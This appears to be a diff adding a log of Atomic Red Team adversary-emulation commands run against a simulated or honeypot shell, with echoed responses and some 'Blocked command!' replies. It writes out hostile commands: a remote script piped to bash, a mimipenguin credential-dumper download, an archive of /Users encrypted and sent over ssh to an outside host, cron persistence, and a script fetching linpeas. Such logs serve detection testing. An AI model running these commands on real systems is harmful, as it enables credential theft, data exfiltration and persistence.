@@ -1,0 +1,148 @@
+action:
+command:whoami
+response:[4hroot@svr04:~# whoami
+[4lroot
+[4hroot@svr04:~# 
+
+action:
+command:wget --post-data="msg=AtomicTestT1048.002" --timeout=5 --no-check-certificate https://example.com/ --delete-after
+response:wget --post-data="msg=AtomicTestT1048.002" --timeout=5 --no-check-certificate https://example.com/ --delete-after
+
+
+action:
+command:curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo-art-fish.sh | bash
+response:curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo-art-fish.sh | bash
+Blocked command!
+
+
+action:
+command:whoami
+response:root@svr04:~# whoami
+[4lroot
+[4hroot@svr04:~# 
+
+action:
+command:wget -O "/tmp/mimipenguin.tar.gz" https://github.com/huntergregal/mimipenguin/releases/download/2.0-release/mimipenguin_2.0-release.tar.gz
+response:wget -O "/tmp/mimipenguin.tar.gz" https://github.com/huntergregal/mimipenguin/releases/download/2.0-release/mimipenguin_2.0-release.tar.gz
+[4lwget: /root/"/tmp/mimipenguin.tar.gz": Cannot open: No such file or directory
+[4hroot@svr04:~# 
+
+action:
+command:mkdir /tmp/mimipenguin
+response:mkdir /tmp/mimipenguin
+
+
+action:
+command:tar -xzvf "/tmp/mimipenguin.tar.gz" -C /tmp/mimipenguin
+response:tar -xzvf "/tmp/mimipenguin.tar.gz" -C /tmp/mimipenguin
+[4ltar: "/tmp/mimipenguin.tar.gz": Cannot open: No such file or directory
+tar: Error is not recoverable: exiting now
+tar: Child returned status 2
+tar: Error exit delayed from previous errors
+[4hroot@svr04:~# 
+
+action:
+command:sudo apt-get -y install binutils
+response:sudo apt-get -y install binutils
+[4l[4hroot@svr04:~# [4lE: Could not open lock file /var/lib/apt/lists/lock - open (13: Permission denied)
+E: Unable to lock the list directory
+[4hroot@svr04:~# 
+
+action:
+command:sudo apt-get -y install python2       
+response:sudo apt-get -y install python2       
+
+
+action:
+command:sudo apt-get -y install libc-bin        
+response:sudo apt-get -y install libc-bin        
+Blocked command!
+[4l[4hroot@svr04:~# [4lE: Could not open lock file /var/lib/apt/lists/lock - open (13: Permission denied)
+E: Unable to lock the list directory
+[4hroot@svr04:~# 
+
+action:
+command:whoami
+response:whoami
+
+
+action:
+command:if grep -iq "debian\|ubuntu\|kali\|mint" /usr/lib/os-release; then apt update && apt install -y binutils curl sqlite3; fi
+response:if grep -iq "debian\|ubuntu\|kali\|mint" /usr/lib/os-release; then apt update && apt install -y binutils curl sqlite3; fi
+bash: if: command not found
+bash: then: command not found
+bash: apt: command not found
+bash: fi: command not found
+root@svr04:~# 
+
+action:
+command:whoami
+response:[4hroot@svr04:~# whoami
+[4lroot
+[4hroot@svr04:~# 
+
+action:
+command:echo "Install netstat on the machine."; exit 1;
+response:echo "Install netstat on the machine."; exit 1;
+[4l
+
+action:
+command:netstat
+response:netstat
+
+
+action:
+command:who -a
+response:who -a
+
+
+action:
+command:cc /home/atomic/T1040/src/freebsd_pcapdemo.c -o /tmp/t1040_freebsd_pcapdemo
+response:cc /home/atomic/T1040/src/freebsd_pcapdemo.c -o /tmp/t1040_freebsd_pcapdemo
+
+
+action:
+command:sudo /tmp/t1040_freebsd_pcapdemo -f -i em0 -t 3
+response:sudo /tmp/t1040_freebsd_pcapdemo -f -i em0 -t 3
+
+
+action:
+command:tar czpf - /Users/* | openssl des3 -salt -pass atomic | ssh atomic@target.example.com 'cat > /Users.tar.gz.enc'
+response:tar czpf - /Users/* | openssl des3 -salt -pass atomic | ssh atomic@target.example.com 'cat > /Users.tar.gz.enc'
+
+
+action:
+command:echo "echo 'Hello from Atomic Red Team' > /tmp/atomic.log" >> /var/spool/cron/crontabs/persistevil
+response:echo "echo 'Hello from Atomic Red Team' > /tmp/atomic.log" >> /var/spool/cron/crontabs/persistevil
+
+
+action:
+command:pip install requests    
+response:pip install requests    
+
+
+action:
+command:which_python=$(which python || which python3 || which python3.9 || which python2)
+response:which_python=$(which python || which python3 || which python3.9 || which python2)
+
+
+action:
+command:echo 'import requests' > T1059.006.py
+response:echo 'import requests' > T1059.006.py
+
+
+action:
+command:echo 'import os' >> T1059.006.py
+response:echo 'import os' >> T1059.006.py
+
+
+action:
+command:echo 'url = "https://github.com/carlospolop/PEASS-ng/releases/download/20220214/linpeas.sh"' >> T1059.006.py
+response:echo 'url = "https://github.com/carlospolop/PEASS-ng/releases/download/20220214/linpeas.sh"' >> T1059.006.py
+
+
+action:
+command:echo 'malicious_command = "sh T1059.006-payload -q -o SysI, Devs, AvaSof, ProCronSrvcsTmrsSocks, Net, UsrI, SofI, IntFiles"' >> T1059.006.py
+response:echo 'malicious_command = "sh T1059.006-payload -q -o SysI, Devs, AvaSof, ProCronSrvcsTmrsSocks, Net, UsrI, SofI, IntFiles"' >> T1059.006.py
+
+
